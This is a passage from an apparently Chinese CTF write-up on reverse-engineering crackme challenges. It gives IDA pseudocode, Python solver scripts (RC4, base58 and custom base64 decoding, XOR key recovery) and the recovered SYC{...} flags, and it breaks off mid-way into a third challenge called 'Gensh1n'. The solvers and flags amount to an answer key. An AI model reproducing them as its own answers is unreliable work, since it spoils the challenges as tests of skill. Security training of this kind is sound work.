</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="bp">self</span><span class="o">.</span><span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">],</span> <span class="bp">self</span><span class="o">.</span><span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">get_byte</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">j</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">S</span><span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">i</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">S</span><span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">i</span><span class="p">],</span> <span class="bp">self</span><span class="o">.</span><span class="n">S</span><span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">S</span><span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">j</span><span class="p">],</span> <span class="bp">self</span><span class="o">.</span><span class="n">S</span><span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">S</span><span class="p">[(</span><span class="bp">self</span><span class="o">.</span><span class="n">S</span><span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">S</span><span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">j</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">crypt</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">byte</span> <span class="o">^</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_byte</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">base58_decode</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">leading_zeros</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">char</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">leading_zeros</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">data</span><span class="p">[</span><span class="n">leading_zeros</span><span class="p">:]:</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">*</span> <span class="mi">58</span> <span class="o">+</span> <span class="n">BASE58_TABLE</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">char</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">decoded</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">result</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">decoded</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">result</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">//=</span> <span class="mi">256</span>
</span></span><span class="line"><span class="cl">    <span class="n">decoded</span><span class="o">.</span><span class="n">extend</span><span class="p">([</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="n">leading_zeros</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="nb">reversed</span><span class="p">(</span><span class="n">decoded</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">base64_decode_custom</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">standard_table</span> <span class="o">=</span> <span class="s2">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">trans</span> <span class="o">=</span> <span class="nb">str</span><span class="o">.</span><span class="n">maketrans</span><span class="p">(</span><span class="n">BASE64_TABLE</span><span class="p">,</span> <span class="n">standard_table</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">standard_b64</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">translate</span><span class="p">(</span><span class="n">trans</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">standard_b64</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt_flag</span><span class="p">(</span><span class="n">cipher_text</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">base58_decoded</span> <span class="o">=</span> <span class="n">base58_decode</span><span class="p">(</span><span class="n">cipher_text</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">base64_decoded</span> <span class="o">=</span> <span class="n">base64_decode_custom</span><span class="p">(</span><span class="n">base58_decoded</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">hex_bytes</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">base64_decoded</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">rc4</span> <span class="o">=</span> <span class="n">RC4</span><span class="p">([</span><span class="mi">17</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">decrypted</span> <span class="o">=</span> <span class="n">rc4</span><span class="o">.</span><span class="n">crypt</span><span class="p">(</span><span class="n">hex_bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">hex_str</span> <span class="o">=</span> <span class="n">decrypted</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">hex_str</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;ascii&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">flag</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">cipher</span> <span class="o">=</span> <span class="s2">&#34;tHMoSoMX71sm62ARQ8aHF6i88nhkH9Ac2J7CrkQsQgXpiy6efoC8YVkzZu1tMyFxCLbbqvgXZHxtwK5TACVhPi1EE5mK6JG56wPNR4d2GmkELGfJHgtcAEH7&#34;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">flag</span> <span class="o">=</span> <span class="n">decrypt_flag</span><span class="p">(</span><span class="n">cipher</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">最终flag: </span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;错误: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="kn">import</span> <span class="nn">traceback</span>
</span></span><span class="line"><span class="cl">        <span class="n">traceback</span><span class="o">.</span><span class="n">print_exc</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="flag-4">flag
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SYC{OHhhhhhhh_y0u_Kn0m_SMCCCC@!}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="qyqsの奇妙冒险">QYQSの奇妙冒险
</h3><h4 id="解题流程-12">解题流程
</h4><p>先看ida伪代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// rdi
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">j</span><span class="p">;</span> <span class="c1">// rcx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">size_t</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// rax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">size_t</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// rax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp+0h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">Input</span><span class="p">[</span><span class="mi">76</span><span class="p">];</span> <span class="c1">// [rsp+28h] [rbp+8h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">key</span><span class="p">[</span><span class="mi">44</span><span class="p">];</span> <span class="c1">// [rsp+74h] [rbp+54h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">QYQS</span><span class="p">[</span><span class="mi">29</span><span class="p">];</span> <span class="c1">// [rsp+A0h] [rbp+80h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+114h] [rbp+F4h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">k</span><span class="p">;</span> <span class="c1">// [rsp+134h] [rbp+114h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">size_t</span> <span class="n">v11</span><span class="p">;</span> <span class="c1">// [rsp+208h] [rbp+1E8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v0</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">v5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">80LL</span><span class="p">;</span> <span class="n">j</span><span class="p">;</span> <span class="o">--</span><span class="n">j</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v0</span> <span class="o">=</span> <span class="o">-</span><span class="mi">858993460</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v0</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">j___CheckForDebuggerJustMyCode</span><span class="p">(</span><span class="o">&amp;</span><span class="n">_F26D15BD_FileName_cpp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">strcpy</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="s">&#34;QYQS&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mi">43</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mi">28</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="mi">23</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="mi">57</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="mi">6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="mi">34</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="mi">41</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="mi">14</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">=</span> <span class="mi">11</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="mi">45</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="mi">109</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="mi">6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">=</span> <span class="mi">32</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">18</span><span class="p">]</span> <span class="o">=</span> <span class="mi">23</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span> <span class="o">=</span> <span class="mi">127</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="o">=</span> <span class="mi">56</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">Menu</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nf">j_scanf_s</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">Input</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="nf">Strlen</span><span class="p">(</span><span class="n">Input</span><span class="p">)</span> <span class="o">==</span> <span class="mi">21</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">v11</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">v3</span> <span class="o">=</span> <span class="nf">Strlen</span><span class="p">(</span><span class="n">Input</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v11</span> <span class="o">&gt;=</span> <span class="n">v3</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">Input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">v11</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">Input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">4</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">k</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">v11</span> <span class="o">=</span> <span class="n">k</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">v4</span> <span class="o">=</span> <span class="nf">Strlen</span><span class="p">(</span><span class="n">Input</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v11</span> <span class="o">&gt;=</span> <span class="n">v4</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">Input</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">!=</span> <span class="n">QYQS</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">goto</span> <span class="n">LABEL_5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">typeWriterEffect</span><span class="p">(</span><span class="o">&amp;</span><span class="n">byte_14001C468</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">j_printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">j_printf</span><span class="p">(</span><span class="n">asc_14001C478</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_getch</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="nl">LABEL_5</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nf">typeWriterEffect</span><span class="p">(</span><span class="o">&amp;</span><span class="n">byte_14001C448</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>输入长度为21,将输入内容的每一位与自己的位数异或后分别与key异或，key得到是 QYQS</p>
<h4 id="exp-13">exp
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">QYQS</span> <span class="o">=</span> <span class="p">[</span><span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">43</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">57</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">41</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">45</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">127</span><span class="p">,</span> <span class="mi">56</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="s2">&#34;QYQS&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">21</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">char</span> <span class="o">=</span> <span class="n">QYQS</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">4</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">char</span> <span class="o">=</span> <span class="n">char</span> <span class="o">^</span> <span class="n">i</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">char</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Flag:&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="flag-5">flag
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SYC{I_@m_QyqS_r1GhT?}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="gensh1n">Gensh1n
</h3><h4 id="解题思路">解题思路
</h4><p>首先不要打开题目
先看ida，以防原神偷家</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
